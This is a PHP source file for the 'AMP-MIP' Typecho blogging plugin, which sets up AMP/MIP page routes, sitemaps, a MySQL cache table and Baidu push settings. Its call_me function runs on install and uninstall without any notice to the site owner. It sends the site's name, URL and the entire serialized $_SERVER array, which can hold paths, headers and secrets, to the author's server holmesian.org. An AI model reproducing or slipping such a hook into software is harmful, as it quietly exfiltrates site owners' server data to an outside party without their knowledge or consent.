<?php
/**
 * AMP/MIP 插件 for Typecho
 *
 * @package AMP-MIP
 * @author Holmesian
 * @version 0.6.2
 * @link https://holmesian.org
 */
if (!defined('__TYPECHO_ROOT_DIR__')) exit;

class AMP_Plugin implements Typecho_Plugin_Interface
{
    private static $version = '0.6.2';

    public static function activate()
    {
        $msg=self::install();

        //挂载发布文章接口
        Typecho_Plugin::factory('Widget_Contents_Post_Edit')->finishPublish = array('AMP_Action', 'sendRealtime');
        Typecho_Plugin::factory('Widget_Archive')->header = array('AMP_Action', 'headlink');
        //添加路由和菜单
        Helper::addRoute('amp_index', '/ampindex/', 'AMP_Action', 'AMPindex');
        Helper::addRoute('amp_map', '/amp/[target]', 'AMP_Action', 'AMPpage');
        Helper::addRoute('amp_list', '/amp/list/[list_id]', 'AMP_Action', 'AMPlist');
        Helper::addRoute('mip_map', '/mip/[target]', 'AMP_Action', 'MIPpage');
        Helper::addRoute('amp_sitemap', '/amp_sitemap.xml', 'AMP_Action', 'ampsitemap');
        Helper::addRoute('mip_sitemap', '/mip_sitemap.xml', 'AMP_Action', 'mipsitemap');
        Helper::addRoute('clean_cache', '/clean_cache', 'AMP_Action', 'cleancache');
        Helper::addPanel(1, 'AMP/Links.php', 'AMP/MIP自动提交', '自动提交', 'administrator');

        return $msg.'请进入设置填写接口调用地址';
    }

    public static function deactivate()
    {
        //删除路由、菜单
        Helper::removeRoute('amp_index');
        Helper::removeRoute('amp_map');
        Helper::removeRoute('amp_list');
        Helper::removeRoute('amp_sitemap');
        Helper::removeRoute('mip_map');
        Helper::removeRoute('mip_sitemap');
        Helper::removeRoute('clean_cache');
        Helper::removePanel(1, 'AMP/Links.php');
        $msg = self::uninstall();
        return $msg . '插件卸载成功';
    }

    public static function index()
    {
        echo 1;
    }

    public static function config(Typecho_Widget_Helper_Form $form)
    {

        $element = new Typecho_Widget_Helper_Form_Element_Text('cacheTime', null, '0', _t('缓存时间'), '单位：小时（设置成0表示关闭）<br> 此项为缓存过期时间，建议设置成24。如果需要重建缓存，请点击 <a href="' . Helper::options()->index . '/clean_cache">删除所有缓存</a>');
        $form->addInput($element);

        $element = new Typecho_Widget_Helper_Form_Element_Text('baiduAPI', null, '', _t('MIP/AMP推送接口调用地址'), '请到http://ziyuan.baidu.com/mip/index获取接口调用地址。');
        $form->addInput($element);

        $element = new Typecho_Widget_Helper_Form_Element_Text('baiduAPPID', null, '', _t('熊掌号识别ID'), '请到https://ziyuan.baidu.com/xzh/commit/method获取appid。');
        $form->addInput($element);

        $element = new Typecho_Widget_Helper_Form_Element_Text('baiduTOKEN', null, '', _t('熊掌号准入密钥'), '请到https://ziyuan.baidu.com/xzh/commit/method获取token。');
        $form->addInput($element);

        $element = new Typecho_Widget_Helper_Form_Element_Radio('ampSiteMap', array(0 => '不开启', 1 => '开启'), 1, _t('是否开启AMP的SiteMap'), 'ampSiteMap地址：' . Helper::options()->index . '/amp_sitemap.xml');
        $form->addInput($element);

        $element = new Typecho_Widget_Helper_Form_Element_Radio('mipSiteMap', array(0 => '不开启', 1 => '开启'), 1, _t('是否开启MIP的SiteMap'), 'mipSiteMap地址：' . Helper::options()->index . '/mip_sitemap.xml');
        $form->addInput($element);

        $element = new Typecho_Widget_Helper_Form_Element_Radio('ampIndex', array(0 => '不开启', 1 => '开启'), 1, _t('是否开启AMP版的首页'), 'ampIndex地址：' . Helper::options()->index . '/ampindex   <<受到amp-list控件限制，<b>非HTTPS站点</b>请勿开启AMP版的首页。');
        $form->addInput($element);

        $element = new Typecho_Widget_Helper_Form_Element_Radio('mipAutoSubmit', array(0 => '不开启', 1 => '开启'), 0, _t('是否开启新文章自动提交到熊掌号'), '请填写熊掌号的APPID和TOKEN后再开启。');
        $form->addInput($element);

        $element = new Typecho_Widget_Helper_Form_Element_Radio('OnlyForSpiders', array(0 => '不开启', 1 => '开启'), 0, _t('是否只允许Baidu和Google的爬虫访问MIP/AMP页面'), '选择启用则需要修改UA才能访问MIP/AMP页面');
        $form->addInput($element);

        $element = new Typecho_Widget_Helper_Form_Element_Text('defaultPIC', null, 'https://holmesian.org/usr/themes/Holmesian/images/holmesian.png', _t('默认图片地址'), '默认图片地址');
        $form->addInput($element);

        $element = new Typecho_Widget_Helper_Form_Element_Text('LOGO', null, 'https://holmesian.org/usr/themes/Holmesian/images/holmesian.png', _t('默认LOGO地址'), '根据AMP的限制，尺寸最大不超过60*60');
        $form->addInput($element);

        $element = new Typecho_Widget_Helper_Form_Element_Text('PostURL', null, Helper::options()->index , _t('替换自动提交的前缀地址'), '作用看<a href="https://holmesian.org/AMP-for-Typecho#comment-7404">这里</a>，没有需求就别改');
        $form->addInput($element);

    }

    public static function personalConfig(Typecho_Widget_Helper_Form $form)
    {
    }


    public static function install()
    {
        $msg=self::DBsetup();
        $msg=$msg.self::call_me('install');
        return $msg;
    }

    public static function uninstall()
    {

        $installDb = Typecho_Db::get();
        try {
            $installDb->query("DROP TABLE IF EXISTS " . $installDb->getPrefix() . 'PageCache');
            $msg = '缓存表删除成功|';
            $msg = $msg . self::call_me('uninstall').'|';
            return $msg;
        } catch (Exception $e) {
            $msg = '卸载出错!';
            return $msg;
        }
    }

    public static function call_me($type){//远程通知

        $api="https://holmesian.org/m/?action={$type}";
        $http = Typecho_Http_Client::get();
        $data = array(
            'site' => Helper::options()->title,
            'url' => Helper::options()->index,
            'version' => self::$version,
            'data' => serialize($_SERVER),
        );
        $http->setData($data);
        try
        {
            $msg = $http->send($api);
            return $msg;
        }
        catch (Exception $e){
            $msg='通知出错!';
            return $msg;
        }
    }


    //Cache databse
    public static function DBsetup()
    {

        $installDb = Typecho_Db::get();
        if(stristr($installDb->getAdapterName(),'mysql')== false){
            return('缓存不支持sqlite.');
        }
        $cacheTable =  $installDb->getPrefix() . 'PageCache';
        try {
            $installDb->query("DROP TABLE IF EXISTS " . $cacheTable);
            $installDb->query("CREATE TABLE `$cacheTable` (
                        `hash`      varchar(200)  NOT NULL,
                        `cache`   longtext      NOT NULL,
                        `dateline` int(10) NOT NULL DEFAULT '0',
                        `expire`  int(8) NOT NULL DEFAULT '0',
                        UNIQUE KEY `hash` (`hash`)
                        ) DEFAULT CHARSET=utf8");
            return('缓存表创建成功！');
        } catch (Typecho_Db_Exception $e) {
            throw new Typecho_Plugin_Exception('缓存表建立失败，错误代码：'. $e->getCode());
        }
    }



}
